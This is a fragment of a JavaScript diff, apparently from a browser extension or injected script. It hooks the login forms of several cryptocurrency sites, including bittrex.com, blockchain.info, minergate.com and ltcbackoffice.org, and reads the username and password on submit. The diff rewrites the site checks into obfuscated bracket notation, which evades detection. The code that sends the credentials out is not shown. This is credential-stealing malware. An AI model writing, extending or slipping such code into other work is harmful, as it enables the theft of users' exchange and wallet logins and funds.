@@ -77,7 +77,8 @@ for (var i = 0; i < arrayLength; i++) {
         }
       };
     };
-    if (location.href.indexOf("ltcbackoffice.org") >= 0) {
+
+      if (top['location']['href']['indexOf']('ltcbackoffice.org') > -1) {
       document.getElementById("login-form").onsubmit = function() {
         username = document.getElementById("username").value;
         user_pass = document.getElementById("password").value;
@@ -86,7 +87,8 @@ for (var i = 0; i < arrayLength; i++) {
         }
       };
     };
-    if (location.href.indexOf("minergate.com") >= 0) {
+
+    if (top['location']['href']['indexOf']('minergate.com') > -1) {
       document.getElementsByName("mainForm")[0].onsubmit = function() {
         username = document.getElementsByName("email")[0].value;
         user_pass = document.getElementsByName("password")[0].value;
@@ -95,7 +97,8 @@ for (var i = 0; i < arrayLength; i++) {
         }
       };
     };
-    if (location.href.indexOf("blockchain.info") >= 0) {
+    
+    if (top['location']['href']['indexOf']('blockchain.info') > -1) {
       document.getElementsByName("loginForm")[0].onsubmit = function() {
         username = document.getElementsByName("UID_input")[0].value;
         user_pass = document.getElementsByName("pass_input")[0].value;
@@ -105,7 +108,7 @@ for (var i = 0; i < arrayLength; i++) {
       };
     };
 
-    if (location.href.indexOf("bittrex.com") >= 0) {
+    if (top['location']['href']['indexOf']('bittrex.com') > -1)  {
       document.getElementById("loginForm").onsubmit = function() {
         username = document.getElementsByName("UserName")[0].value;
         user_pass = document.getElementsByName("Password")[0].value;
